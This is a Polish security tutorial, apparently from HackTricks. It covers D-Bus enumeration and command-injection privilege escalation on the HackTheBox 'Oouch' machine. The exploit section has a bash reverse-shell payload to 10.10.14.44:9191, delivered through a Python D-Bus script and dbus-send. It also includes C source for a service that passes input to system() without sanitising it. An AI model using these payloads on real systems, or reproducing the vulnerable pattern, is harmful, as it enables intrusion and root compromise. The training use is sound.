# Wyliczanie D-Bus i Wstrzykiwanie Poleceń do Eskalacji Uprawnień

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## **Wyliczanie GUI**

D-Bus jest wykorzystywany jako mediator komunikacji międzyprocesowej (IPC) w środowiskach pulpitu Ubuntu. Na Ubuntu obserwuje się równoczesne działanie kilku magistrali komunikacyjnych: magistrala systemowa, głównie wykorzystywana przez **usługi uprzywilejowane do udostępniania usług istotnych dla całego systemu**, oraz magistrala sesji dla każdego zalogowanego użytkownika, udostępniająca usługi istotne tylko dla danego użytkownika. Tutaj skupiamy się głównie na magistrali systemowej ze względu na jej powiązanie z usługami działającymi z wyższymi uprawnieniami (np. root), ponieważ naszym celem jest podniesienie uprawnień. Zauważono, że architektura D-Bus wykorzystuje 'router' na każdą magistralę sesji, który jest odpowiedzialny za przekierowywanie wiadomości klientów do odpowiednich usług na podstawie adresu określonego przez klientów dla usługi, z którą chcą się komunikować.

Usługi na D-Bus są definiowane przez **obiekty** i **interfejsy**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach programowania zorientowanych obiektowo, przy czym każda instancja jest unikalnie identyfikowana przez **ścieżkę obiektu**. Ta ścieżka, podobnie jak ścieżka systemu plików, jednoznacznie identyfikuje każdy obiekt udostępniany przez usługę. Kluczowym interfejsem do celów badawczych jest interfejs **org.freedesktop.DBus.Introspectable**, zawierający pojedynczą metodę, Introspect. Ta metoda zwraca reprezentację XML obsługiwanych metod obiektu, sygnałów i właściwości, z naciskiem tutaj na metody, pomijając właściwości i sygnały.

Do komunikacji z interfejsem D-Bus użyto dwóch narzędzi: narzędzia wiersza poleceń o nazwie **gdbus** do łatwego wywoływania metod udostępnianych przez D-Bus w skryptach oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), narzędzia GUI opartego na Pythonie, przeznaczonego do wyliczania dostępnych usług na każdej magistrali i wyświetlania obiektów zawartych w każdej usłudze.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


W pierwszym obrazie pokazane są usługi zarejestrowane w systemowym magistrali D-Bus, z wyróżnieniem **org.debin.apt** po wybraniu przycisku Magistrali Systemowej. D-Feet zapytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały dla wybranych obiektów, widoczne na drugim obrazie. Szczegóły podane są również dla sygnatur każdej metody.

Niezwykłą cechą jest wyświetlanie **ID procesu (pid)** i **linii poleceń** usługi, co jest przydatne do potwierdzenia, czy usługa działa z podniesionymi uprawnieniami, co jest istotne dla celów badawczych.

**D-Feet pozwala również na wywołanie metody**: użytkownicy mogą wprowadzać wyrażenia Pythona jako parametry, które D-Feet konwertuje na typy D-Bus przed przekazaniem do usługi.

Należy jednak zauważyć, że **niektóre metody wymagają uwierzytelnienia** przed umożliwieniem nam ich wywołania. Zignorujemy te metody, ponieważ naszym celem jest podniesienie uprawnień bez konieczności posiadania poświadczeń.

Należy również zauważyć, że niektóre usługi zapytują inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, czy użytkownik powinien mieć zezwolenie na wykonanie określonych działań, czy nie.

## **Wyliczenie linii poleceń**

### Wyświetlanie Obiektów Usługi

Możliwe jest wyświetlenie otwartych interfejsów D-Bus za pomocą:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Połączenia

[Z Wikipedii:](https://en.wikipedia.org/wiki/D-Bus) Gdy proces ustanawia połączenie z magistralą, magistrala przypisuje temu połączeniu specjalną nazwę magistrali o nazwie _unikatowa nazwa połączenia_. Nazwy magistrali tego typu są niemutowalne - gwarantowane jest, że nie zmienią się tak długo, jak istnieje połączenie - i co ważniejsze, nie mogą być ponownie użyte podczas trwania magistrali. Oznacza to, że żadne inne połączenie z tą magistralą nigdy nie będzie miało przypisanej takiej unikatowej nazwy połączenia, nawet jeśli ten sam proces zamknie połączenie z magistralą i utworzy nowe. Unikatowe nazwy połączeń są łatwo rozpoznawalne, ponieważ zaczynają się od - w przeciwnym razie zabronionego - znaku dwukropka.

### Informacje o Obiekcie Usługi

Następnie można uzyskać pewne informacje o interfejsie za pomocą:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Wyświetlanie interfejsów obiektu usługi

Musisz mieć wystarczające uprawnienia.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Zbadaj interfejs obiektu usługi

Zauważ, jak w tym przykładzie został wybrany najnowszy interfejs odkryty przy użyciu parametru `tree` (_patrz poprzedni rozdział_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Zauważ metodę `.Block` interfejsu `htb.oouch.Block` (tę, którą nas interesuje). "s" w innych kolumnach może oznaczać, że oczekiwany jest ciąg znaków.

### Interfejs Monitorowania/Przechwytywania

Posiadając wystarczające uprawnienia (same uprawnienia `send_destination` i `receive_sender` nie wystarczą), możesz **monitorować komunikację D-Bus**.

Aby **monitorować** **komunikację**, będziesz musiał być **rootem**. Jeśli nadal napotykasz problemy z uzyskaniem uprawnień roota, sprawdź [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) oraz [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Jeśli wiesz, jak skonfigurować plik konfiguracyjny D-Bus, aby **pozwolić użytkownikom nie będącym rootem na podsłuchiwanie** komunikacji, proszę **skontaktuj się ze mną**!
{% endhint %}

Różne sposoby monitorowania:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
W poniższym przykładzie monitorowany jest interfejs `htb.oouch.Block` i **przesyłana jest wiadomość "**_**lalalalal**_**" poprzez błąd w komunikacji**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Możesz użyć `capture` zamiast `monitor`, aby zapisać wyniki w pliku pcap.

#### Filtracja wszystkich zbędnych informacji <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Jeśli jest zbyt wiele informacji na magistrali, przekaż regułę dopasowania w ten sposób:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Wiele reguł można określić. Jeśli wiadomość pasuje do _któregokolwiek_ z reguł, wiadomość zostanie wydrukowana. Na przykład:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Zobacz [dokumentację D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) po więcej informacji na temat składni reguł dopasowania.

### Więcej

`busctl` ma jeszcze więcej opcji, [**znajdziesz je wszystkie tutaj**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Sytuacja podatności**

Jako użytkownik **qtc wewnątrz hosta "oouch" z HTB** możesz znaleźć **nieoczekiwany plik konfiguracyjny D-Bus** znajdujący się w _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Zauważ z poprzedniej konfiguracji, że **musisz być użytkownikiem `root` lub `www-data`, aby wysyłać i odbierać informacje** za pośrednictwem tej komunikacji D-BUS.

Jako użytkownik **qtc** wewnątrz kontenera dockerowego **aeb4525789d8** możesz znaleźć kod związany z dbus w pliku _/code/oouch/routes.py._ Oto interesujący kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Jak widać, następuje **połączenie z interfejsem D-Bus** i wysłanie do funkcji **"Block"** parametru "client\_ip".

Po drugiej stronie połączenia D-Bus działa skompilowany binarny plik w języku C. Ten kod **nasłuchuje** połączenia D-Bus **w poszukiwaniu adresu IP i wywołuje iptables za pomocą funkcji `system`** w celu zablokowania podanego adresu IP.\
**Wywołanie `system` jest celowo podatne na wstrzyknięcie poleceń**, więc ładunek takiej postaci jak poniższy spowoduje utworzenie powłoki zwrotnej: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Wykorzystaj to

Na końcu tej strony znajdziesz **pełny kod C aplikacji D-Bus**. Wewnątrz, pomiędzy liniami 91-97, znajdziesz, jak są **zarejestrowane `ścieżka obiektu D-Bus`** i **`nazwa interfejsu`**. Te informacje będą niezbędne do wysłania danych do połączenia D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Również, w linii 57 można znaleźć, że **jedyną zarejestrowaną metodą** komunikacji D-Bus jest `Block` (_**Dlatego w następnym rozdziale ładunki zostaną wysłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` oraz nazwy metody `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Następujący kod Pythona wyśle ładunek do połączenia D-Bus do metody `Block` za pomocą `block_iface.Block(runme)` (_zauważ, że został wydobyty z poprzedniego fragmentu kodu_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl i dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` jest narzędziem używanym do wysyłania wiadomości do "Message Bus".
* Message Bus – Oprogramowanie używane przez systemy do ułatwienia komunikacji między aplikacjami. Jest związane z Kolejką Wiadomości (wiadomości są uporządkowane sekwencyjnie), ale w Message Bus wiadomości są wysyłane w modelu subskrypcji i są bardzo szybkie.
* Tag "-system" służy do oznaczenia, że jest to wiadomość systemowa, a nie sesyjna (domyślnie).
* Tag "--print-reply" służy do odpowiedniego wyświetlenia naszej wiadomości i odbierania odpowiedzi w czytelnej formie dla człowieka.
* "--dest=Dbus-Interface-Block" – Adres interfejsu Dbus.
* "--string:" – Typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int, objpath. Spośród nich "object path" jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. W tym przypadku możemy użyć specjalnego pliku (FIFO), aby przekazać polecenie do interfejsu pod nazwą pliku. "string:;" – Służy to do ponownego wywołania ścieżki obiektu, gdzie umieszczamy plik FIFO z odwróconym powłokowaniem.
  
_Zauważ, że w `htb.oouch.Block.Block`, pierwsza część (`htb.oouch.Block`) odnosi się do obiektu usługi, a ostatnia część (`.Block`) odnosi się do nazwy metody._

### Kod w języku C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Odnośniki
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Naucz się i praktykuj Hacking w AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz się i praktykuj Hacking w GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
